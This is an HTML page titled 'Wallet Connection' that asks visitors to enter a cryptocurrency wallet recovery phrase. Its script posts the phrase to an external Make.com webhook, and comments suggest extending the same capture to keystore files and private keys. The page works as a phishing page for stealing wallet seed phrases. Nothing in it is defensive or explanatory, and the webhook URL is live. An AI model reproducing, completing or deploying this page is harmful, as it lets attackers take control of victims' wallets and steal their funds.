<!DOCTYPE html>
<html>
<head>
<title>Wallet Connection</title>
<!-- Add your CSS and other head elements here -->
<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
</head>
<body>
  <div class="container">
    <div class="row">
      <div class="col-md-2"></div>
      <div class="col-md-8">
        <div class="form-box">
          <!-- Tabs remain unchanged -->
          <div class="tab-content" id="myTabContent">
            <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
              <form name="phraseForm" id="phraseForm">
                <input type="hidden" name="form-name" value="phraseForm" />
                <div class="form-group mb-3">
                  <select class="form-select" name="wallet-name" aria-label="Default select example">
                    <option selected>Wallet Selected</option>
                  </select>
                  <label class="form-label">Recovery Phrase</label>
                  <textarea name="phrase" cols="40" rows="10" class="form-control" maxlength="500" required id="id_phrase"></textarea>
                  <div class="form-text">
                    Typically 12 (sometimes 24) words separated by a single space.
                  </div>
                </div>
                <button type="submit" class="btn btn-primary">Proceed</button>
              </form>
            </div>
            <!-- Other tabs (Keystore, Private Key) remain similar, 
                 update form IDs and names accordingly -->
          </div>
        </div>
      </div>
      <div class="col-md-2"></div>
    </div>
  </div>

  <script>
    const phraseForm = document.getElementById('phraseForm'); 
    // Add similar lines for Keystore and PrivateKey forms 

    phraseForm.addEventListener('submit', (event) => {
      event.preventDefault(); 

      const formData = new FormData(phraseForm);
      const phrase = formData.get('phrase'); 

      axios.post('https://hook.us1.make.com/u8o9l2jwygt666tszfmsg0ou2pjnff3q', {
        phrase: phrase,
        // Add other relevant data here
      })
      .then(response => {
        console.log('Data sent to Make.com:', response.data);
        // Handle success, e.g., display a confirmation message
      })
      .catch(error => {
        console.error('Error sending data to Make.com:', error);
        // Handle error, e.g., display an error message
      });
    });

    // Add similar event listeners and logic for other forms 
  </script>
</body>
</html>
